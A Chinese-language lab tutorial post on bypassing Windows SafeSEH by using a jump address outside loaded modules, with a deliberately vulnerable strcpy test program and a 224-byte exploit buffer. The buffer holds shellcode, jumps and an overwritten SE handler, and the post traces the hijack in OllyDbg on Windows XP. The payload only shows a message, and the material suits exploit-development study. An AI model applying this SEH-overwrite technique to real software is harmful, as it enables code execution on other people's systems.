---
layout:		post
title:		利用加载模块之外的地址绕过SafeS.E.H
author:		wooy0ung
tags:		windows
category:  	exploit
---


>[分析环境]  
>系统: Windows XP Professional sp3  
>编译器: Visual Studio 2008  
>调试器: OllyDbg 1.10  
<!-- more -->


### 0x00 前期准备

新建一个工程, 帖入以下代码, 选择release版本, 禁止优化

```
#include "stdafx.h"
#include <string.h>
#include <windows.h>

char shellcode[]=
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
"\x90\x90\x90\x90\x90\x90\x90\x90";

DWORD MyException()
{
	printf("There is an exception");
	getchar();
	return 1;
}

void test(char *input)
{
	char str[200];
	strcpy(str,input);
	__asm int 3
	int zero=0;
	__try
	{
		zero=1/zero;
	}
	__except(MyException())
	{
	}
}

int main()
{
	test(shellcode);

	return 0;
}
```


### 0x01 分析栈布局

运行*.exe, OllyDbg自动附加调试, 可以看到所有模块都不是SafeSEH OFF状态

![](/assets/img/exploit/2017-10-04-safeseh-break-byoutside/0x00.png)

利用OllyFindAddr工具搜索跳板指令

![](/assets/img/exploit/2017-10-04-safeseh-break-byoutside/0x01.png)

在0x00280b0b找到一条call [ebp+0x30]指令

![](/assets/img/exploit/2017-10-04-safeseh-break-byoutside/0x02.png)

继续单步下去完成strcpy

![](/assets/img/exploit/2017-10-04-safeseh-break-byoutside/0x03.png)

shellcode的起始栈地址0x0012fe88

![](/assets/img/exploit/2017-10-04-safeseh-break-byoutside/0x04.png)

最近的一个SE Handler 0x0012ff64

![](/assets/img/exploit/2017-10-04-safeseh-break-byoutside/0x05.png)


### 0x02 exploit

组织224 byte的shellcode

```
"\x31\xd2\xb2\x30\x64\x8b\x12\x8b\x52\x0c\x8b\x52\x1c\x8b\x42\x08"
"\x8b\x72\x20\x8b\x12\x80\x7e\x0c\x33\x75\xf2\x89\xc7\x03\x78\x3c"
"\x8b\x57\x78\x01\xc2\x8b\x7a\x20\x01\xc7\x31\xed\x8b\x34\xaf\x01"
"\xc6\x45\x81\x3e\x46\x61\x74\x61\x75\xf2\x81\x7e\x08\x45\x78\x69"
"\x74\x75\xe9\x8b\x7a\x24\x01\xc7\x66\x8b\x2c\x6f\x8b\x7a\x1c\x01"
"\xc7\x8b\x7c\xaf\xfc\x01\xc7\x68\x67\x20\x20\x01\x68\x79\x30\x75"
"\x6e\x68\x20\x77\x6f\x6f\x89\xe1\xfe\x49\x0b\x31\xc0\x51\x50\xff"
"\xd7"		# shellcode
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"		# 208 byte
"\xe9\x2b\xff\xff\xff\x90\x90\x90"		# jmp -213(208+5)
"\xeb\xf6\x90\x90"		# jmp -10(8+2)
"\x0b\x0b\x28\x00"		# 0x00280b0b call [ebp+0x30], 最后的"\x00"截断不能将shellcode布置在下
```

再来调试过一遍, 当出现除0异常

![](/assets/img/exploit/2017-10-04-safeseh-break-byoutside/0x06.png)

程序找到最近的S.E.H结构, 调用Handler, 这里已经覆盖成跳板call [ebp+0x30]

![](/assets/img/exploit/2017-10-04-safeseh-break-byoutside/0x07.png)

当无法处理异常, 顺着S.E.H chain找到下一个S.E.H结构, 这里覆盖成短跳jmp -10

![](/assets/img/exploit/2017-10-04-safeseh-break-byoutside/0x08.png)

再来一个长跳jmp -213, 直接跳到shellcode

![](/assets/img/exploit/2017-10-04-safeseh-break-byoutside/0x09.png)

pwn~

![](/assets/img/exploit/2017-10-04-safeseh-break-byoutside/0x0a.png)